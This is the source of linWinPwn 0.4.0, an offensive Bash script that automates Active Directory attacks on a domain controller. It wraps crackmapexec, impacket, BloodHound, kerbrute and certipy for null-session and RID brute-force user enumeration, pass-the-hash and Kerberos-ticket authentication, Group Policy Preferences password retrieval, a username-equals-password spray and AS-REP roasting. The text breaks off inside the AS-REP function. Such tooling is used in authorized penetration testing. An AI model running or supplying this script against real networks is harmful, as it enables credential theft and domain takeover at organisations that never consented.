#!/bin/bash
# Title: linWinPwn
# Author: lefayjey
# Version: 0.4.0

#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
modules="interactive"
output_dir="$(pwd)"
pass_list="/usr/share/wordlists/rockyou.txt"
users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
allservers_bool=true

#Tools variables
python=$(which python3)
impacket_dir="/usr/share/doc/python3-impacket/examples"
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
crackmapexec=$(which crackmapexec)
john=$(which john)
smbmap=$(which smbmap)
nmap=$(which nmap)
adidnsdump=$(which adidnsdump)
certi_py=$(which certi.py)
certipy=$(which certipy)
scripts_dir="/opt/lwp-scripts"
wordlists_dir="/opt/lwp-wordlists"
donpapi_dir="$scripts_dir/DonPAPI-main"

#pass_list="$wordlists_dir/rockyou.txt" #Non-Kali-variables
#users_list="$wordlists_dir/xato-net-10-million-usernames.txt" #Non-Kali-variables
#impacket_dir="/usr/local/bin" #Non-Kali-variables

print_banner () {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN} version 0.4.0
      ${NC}https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
"
}

help_linWinPwn () {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h/--help         Show the help message"
    echo -e "-t/--target       DC IP or target Domain ${RED}[MANDATORY]${NC}"
    echo -e "-u/--username     Username (default: empty)"
    echo -e "-p/--password     Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
    echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
    echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
    echo -e "-o/--output       Output directory (default: current dir)"
    echo -e ""
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain -d domain -u user -p password_or_hash_or_kerbticket" >&2;
    echo -e ""
}

args=()
while test $# -gt 0; do
        case $1 in
            -d) domain="${2}"; shift;;
            --domain) domain="${2}"; shift;;
            -u) user="${2}"; shift;; #leave empty for anonymous login
            --user) user="${2}"; shift;; #leave empty for anonymous login
            -p) password="${2}"; shift;; #password or NTLM hash or location of krb5cc ticket
            --password) password="${2}"; shift;; #password or NTLM hash or location of krb5cc ticket
            -t) dc_ip="${2}"; shift;; #mandatory
            --target) dc_ip="${2}"; shift;; #mandatory
            -M) modules="${2}"; shift;; #comma separated modules to run
            --Modules) modules="${2}"; shift;; #comma separated modules to run
            -o) output_dir="${2}"; shift;;
            --output) output_dir="${2}"; shift;;
            -h) help_linWinPwn; exit;;
            --help) help_linWinPwn; exit;;
            \?) echo -e "Unknown option: ${2}" >&2; exit 1;;
            *) args+=($1);;
        esac
        shift
done
set -- "${args[@]}"

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[-] Missing target... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please ensure crackmapexec is installed and try again... ${NC}"
        exit 1
    else
        dc_info=$(${crackmapexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
    kdc=""

    if [ -z "$dc_domain" ] ; then
        echo -e "${RED}[-] Please ensure the target is a Domain Controller and try again... ${NC}"
        exit 1
    elif [ -z "$domain" ] ; then
        domain=${dc_domain}
    fi

    nullsess_bool=false
    hash_bool=false
    kerb_bool=false

    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
    output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"

    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
    servers_list="${output_dir}/DomainRecon/server_custom_list_${dc_domain}.txt"
    dc_hostname_list="${output_dir}/DomainRecon/server_list_dc_${dc_domain}.txt"
    sql_hostname_list="${output_dir}/DomainRecon/server_list_sql_${dc_domain}.txt"
    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"

    if [ ! -f "${users_list}" ] ; then
        echo -e "${RED}[-] Users list file not found${NC}"
    fi

    if [ ! -f "${pass_list}" ] ; then
        echo -e "${RED}[-] Passwords list file not found${NC}"
    fi

    #Check if null session is used
    if [ "${user}" == "" ]  && [ "${password}" == "" ]; then
        nullsess_bool=true
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme=""
        argument_smbmap=""
        auth_string="${YELLOW}[i]${NC} Authentication method: null session ${NC}"
    
    #Check if username is not provided
    elif [ "${user}" == "" ]; then
        echo -e "${RED}[i]${NC} Please specify username and try again..."
        exit 1
    
    #Check if empty password is used
    elif [ "${password}" == "" ]; then
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme="-d ${domain} -u ${user} -p ''"
        argument_ldapdns="-u ${domain}\\${user} -p ''"
        argument_smbmap="-d ${domain} -u ${user} -p ''"
        argument_imp="${domain}/${user}:''"
        argument_bhd="-u ${user}@${domain} -p ''"
        argument_windap="-d ${domain} -u ${user} -p ''"
        argument_gMSA="-d ${domain} -u ${user} -p ''"
        argument_LRS="-u ${user} -p ''"
        argument_certipy="-u ${user}@${domain} -p ''"
        auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
    
    #Check if NTLM hash is used, and complete with empty LM hash
    elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
        hash_bool=true
        if [ "$(echo $password | cut -d ":" -f 1)" == "" ]; then
            password="aad3b435b51404eeaad3b435b51404ee"$password
        fi
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme="-d ${domain} -u ${user} -H ${password}"
        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_imp=" -hashes ${password} ${domain}/${user}"
        argument_donpapi=" --hashes ${password} ${domain}/${user}"
        argument_bhd="-u ${user}@${domain} --hashes ${password}"
        argument_windap="-d ${domain} -u ${user} --hash ${password}"
        argument_gMSA="-d ${domain} -u ${user} -p ${password}"
        argument_LRS="-u ${user} -nthash $(echo ${password} | cut -d ':' -f 2)"
        argument_certipy="-u ${user}@${domain} -hashes ${password}"
        auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
    
    #Check if kerberos ticket is used
    elif [ -f "${password}" ] ; then
        kerb_bool=true
        target=${dc_domain}
        target_dc=${dc_hostname_list}
        target_sql=${sql_hostname_list}
        export KRB5CCNAME=$(realpath $password)
        argument_cme="-d ${domain} -u ${user} -k"
        argument_imp="-k -no-pass ${domain}/${user}"
        argument_donpapi="-k -no-pass ${domain}/${user}"
        argument_bhd="-u ${user}@${domain} -k"
        argument_gMSA="-d ${domain} -u ${user} -k"
        argument_certipy="-u ${user}@${domain} -k -no-pass"
        kdc="$(echo $dc_FQDN | cut -d '.' -f 1)."
        auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
    
    #Password authentication is used
    else
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme="-d ${domain} -u ${user} -p ${password}"
        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_imp="${domain}/${user}:${password}"
        argument_donpapi="${domain}/${user}:${password}"
        argument_bhd="-u ${user}@${domain} -p ${password}"
        argument_windap="-d ${domain} -u ${user} -p ${password}"
        argument_gMSA="-d ${domain} -u ${user} -p ${password}"
        argument_LRS="-u ${user} -p ${password}"
        argument_certipy="-u ${user}@${domain} -p ${password}"
        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
        auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
    fi

    if [ "${nullsess_bool}" == false ] ; then
        auth_check=$(${crackmapexec} smb ${target} ${argument_cme} | grep "\[-\]")
        if [ ! -z "$auth_check" ] ; then
            echo -e "${RED}[-] Authentication failed! Please check your credentials and try again... ${NC}"
            exit 1
        fi
    fi

    mkdir -p ${output_dir}/Scans
    mkdir -p ${output_dir}/DomainRecon/BloodHound
    mkdir -p ${output_dir}/DomainRecon/LDAPDump
    mkdir -p ${output_dir}/Kerberos
    mkdir -p ${output_dir}/Shares/SharesDump
    mkdir -p ${output_dir}/Credentials
    mkdir -p ${output_dir}/Vulnerabilities
    mkdir -p /tmp/shared
    echo -e ""
    
    echo ${dc_ip} >> ${servers_ip_list}
    echo ${dc_ip} >> ${dc_ip_list}
    echo ${dc_FQDN} >> ${dc_hostname_list}
}

dns_enum () {
    if [ ! -f "${adidnsdump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    elif [ ! -f "${dns_records}" ]; then
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
        elif [ "${kerb_bool}" == true ] ; then
            echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
        else
            echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
            ${adidnsdump} ${argument_ldapdns} --dns-tcp ${dc_ip}
            mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
            /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 > ${dc_hostname_list}
        fi
    else
        echo -e "${YELLOW}[i] DNS dump found ${NC}"
    fi

    echo -e ""
}

smb_scan () {
    if [ "${allservers_bool}" == true ] ; then
        servers_scan_list=${servers_ip_list}
        echo -e "${YELLOW}[i] Targeting all domain servers ${NC}"
    else
        servers_scan_list=${servers_list}
        echo -e "${YELLOW}[i] Targeting servers in ${servers_list} ${NC}"
    fi

    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        echo -e "${BLUE}[*] Running nmap scan on port 445 ${NC}"
        if [ "${allservers_bool}" == true ] ; then
            servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
            if [ ! -f "${servers_smb_list}" ]; then
                ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        else
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
        fi
    fi
    echo -e ""
}

bhd_enum () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    elif [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
        echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        else
            echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
            current_dir=$(pwd)
            cd ${output_dir}/DomainRecon/BloodHound
            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

bhd_enum_dconly () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    elif [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
        echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
    else
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
        else 
            echo -e "${BLUE}[*] BloodHound Enumeration using DCOnly${NC}"
            current_dir=$(pwd)
            cd ${output_dir}/DomainRecon/BloodHound
            ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
            cd ${current_dir}
        fi
    fi
    echo -e ""
}

ldapdomain_enum () {
    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    elif [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDump/ 2>/dev/null)" ] ; then
        echo -e "${YELLOW}[i] ldapdomain results found ${NC}"
    else
        echo -e "${BLUE}[*] ldapdomain Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump 2>/dev/null
        elif [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] ldapdomain does not support kerberos tickets${NC}"
        else
            ${ldapdomaindump} ${argument_ldapdns} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump 2>/dev/null
        fi

        #Parsing user and computer lists
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldap_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
        echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

windapsearch_enum () {
    if [ ! -f "${scripts_dir}/windapsearch" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
    else
        if [ "${kerb_bool}" == false ]; then
            echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m users > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m computers > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m groups > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m privileged-users > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
        else
                echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets${NC}"
        fi

        #Parsing user and computer lists
        /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u  > ${output_dir}/DomainRecon/users_list_windap_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u  > ${output_dir}/DomainRecon/servers_list_windap_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u  > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
        echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
        echo -e "windapsearch enumeration of users, servers, groups complete."
    fi
    echo -e ""
}

enum4linux_enum () {
    if [ ! -f "${scripts_dir}/enum4linux-ng.py" ] ; then
        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
    else
        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            ${python} ${scripts_dir}/enum4linux-ng.py -A ${dc_ip} | tee ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
        elif [ "${kerb_bool}" == true ] || [ "${hash_bool}" == true ] ; then
                echo -e "${PURPLE}[-] enum4linux does not support kerberos tickets nor PtH${NC}"
        else
            ${python} ${scripts_dir}/enum4linux-ng.py -A ${argument_enum4linux} ${dc_ip} | tee ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
        fi
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_${dc_domain}.txt 2>&1
    fi
}

ridbrute_attack () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
        ${crackmapexec} smb ${target} ${argument_cme} --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
        /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
        count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force"
        echo -e ""
    else
        echo -e "${PURPLE}[-] Null session RID brute force can only be ran without credentials${NC}"
    fi
}

users_enum () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] Users Enumeration (Null session)${NC}"
        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/users_nullsess_smb_${dc_domain}.txt
        ${crackmapexec} ldap ${target} -u '' -p '' --users --kdcHost "${kdc}${dc_domain}" > ${output_dir}/DomainRecon/users_nullsess_ldap_${dc_domain}.txt
        /bin/cat ${output_dir}/DomainRecon/users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum"
        echo -e ""
    else
        echo -e "${PURPLE}[-] Null session Users enum can only be ran without credentials${NC}"
    fi
}

passpol_enum () {
    echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
    ${crackmapexec} smb ${target} ${argument_cme} --pass-pol 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
    echo -e ""
}

gpp_enum () {
    echo -e "${BLUE}[*] GPP Enumeration${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
    echo -e ""
}

passnotreq_enum () {
    echo -e "${BLUE}[*] Password not required Enumeration${NC}"
    ${crackmapexec} ldap ${target_dc} ${argument_cme} --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
    echo -e ""
}

adcs_enum () {
    echo -e "${BLUE}[*] ADCS Enumeration${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M adcs --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_adcs_output_${dc_domain}.txt 2>&1
    echo -e ""
}

passdesc_enum () {
    echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M get-desc-users --kdcHost "${kdc}${dc_domain}" 2>/dev/null | grep -i "pass" | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
    echo -e ""
}

macq_enum () {
    echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M MAQ --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ldapsign_enum () {
    echo -e "${BLUE}[*] LDAP-signing check${NC}"
    ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-signing --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
    ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-checker --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
    echo -e ""
}

deleg_enum_cme () {
    echo -e "${BLUE}[*] Trusted-for-delegation check (cme)${NC}"
    ${crackmapexec} ldap ${target_dc} ${argument_cme} --trusted-for-delegation --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
    echo -e ""
}

deleg_enum_imp () {
    if [ ! -f "${impacket_dir}/findDelegation.py" ] ; then
        echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] impacket requires credentials${NC}"
        else
            ${python} ${impacket_dir}/findDelegation.py ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
            if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
                echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
            fi
        fi
    fi
    echo -e ""
}

certi_py_enum () {
    if [[ ! -f "${certi_py}" ]] && [[ ! -f "${impacket_dir}/getTGT.py)" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certi.py and the location of getTGT.py${NC}"
    elif [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
    else
        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
        if  [ "${kerb_bool}" == false ] ; then
            current_dir=$(pwd)
            cd ${output_dir}
            ${python} ${impacket_dir}/getTGT.py ${argument_imp} -dc-ip ${dc_ip}
            cd ${current_dir}
            export KRB5CCNAME="${output_dir}/${user}.ccache"
        fi
        ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class ca | tee ${output_dir}/DomainRecon/certi.py_CA_output_${dc_domain}.txt
        ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class service | tee ${output_dir}/DomainRecon/certi.py_CAServices_output_${dc_domain}.txt
        ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --vuln --enabled | tee ${output_dir}/DomainRecon/certi.py_vulntemplates_output_${dc_domain}.txt
    fi
    echo -e ""
}

certipy_enum () {
    if [[ ! -f "${certipy}" ]]  ; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    elif [ "${nullsess_bool}" == true ] ; then
        echo -e "${PURPLE}[-] certipy requires credentials${NC}"
    else
        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
        current_dir=$(pwd)
        cd ${output_dir}/DomainRecon
        ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp 2>/dev/null | tee ${output_dir}/DomainRecon/certipy_output_${dc_domain}.txt
        ${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -scheme ldap | tee -a ${output_dir}/DomainRecon/certipy_output_${dc_domain}.txt
        cd ${current_dir}
    fi
    echo -e ""
}

kerbrute_enum () {
    if [ "${nullsess_bool}" == true ] ; then
        if [ ! -f "${scripts_dir}/kerbrute"  ] ; then
            echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
        else
            echo -e "${BLUE}[*] kerbrute User Enumeration (Null session)${NC}"
            echo -e "${YELLOW}[i] Using $users_list wordlist for user enumeration. This may take a while...${NC}"
            "${scripts_dir}/kerbrute" userenum ${users_list} -d ${dc_domain} --dc ${dc_ip} -t 5 > ${output_dir}/Kerberos/kerbrute_user_output_${dc_domain}.txt 2>&1
            if [ -s "${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing valid accounts...${NC}"
                /bin/cat ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>/dev/null | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 | tee ${output_dir}/DomainRecon/users_list_kerbrute_${dc_domain}.txt 2>&1
            fi
        fi
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        echo -e ""
    else
        echo -e "${PURPLE}[-] Kerbrute null session enumeration can only be ran without credentials${NC}"
    fi 
}

userpass_check () {
    if [ ! -f "${scripts_dir}/kerbrute"  ] ; then
        echo -e "${RED}[-] Please verify the location of kerbrute${NC}"
    else
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        user_pass_wordlist="${output_dir}/Kerberos/kerbrute_userpass_wordlist__${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        
        echo -e "${BLUE}[*] kerbrute User=Pass Check (Noisy!)${NC}"
        if [ -s "${known_users_list}" ] ; then
            echo -e "${YELLOW}[i] Finding users with Password = username using kerbrute. This may take a while...${NC}"
            /bin/rm "${user_pass_wordlist}" 2>/dev/null
            for i in $(/bin/cat ${known_users_list}); do
                echo -e "${i}:${i}" >> "${user_pass_wordlist}"
            done
            "${scripts_dir}/kerbrute" bruteforce "${user_pass_wordlist}" -d ${dc_domain} --dc ${dc_ip} -t 5 > ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/Kerberos/kerbrute_pass_output_${dc_domain}.txt 2>&1 | grep "VALID" | cut -d " " -f 8 | cut -d "@" -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt"
            if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt" ] ; then
                echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
                /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_${dc_domain}.txt 2>/dev/null
            else
                echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
            fi
        else
            echo -e "${YELLOW}[i] No known users found. Run user enumeraton (ldapdomaindump, enum4linux or windapsearch) and try again.${NC}"
        fi
    fi
    echo -e ""
}

asrep_attack () {
    if [ ! -f "${impacket_dir}/GetNPUsers.py" ]; then
        echo -e "${RED}[-] GetNPUsers.py not found! Please verify the installation of impacket${NC}"
    else
        known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
        /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
        
        echo -e "${BLUE}[*] AS REP Roasting Attack${NC}"
        if [[ "${dc_domain}" != "${domain}" ]] || [ "${nullsess_bool}" == true ] ; then
            if [ -s "${known_users_list}" ] ; then
                users_scan_list=${known_users_list}
            else
                echo -e "${YELLOW}[i] No credentials for target domain provided. Using $users_list wordlist...${NC}"
                users_scan_list=${users_list}
            fi
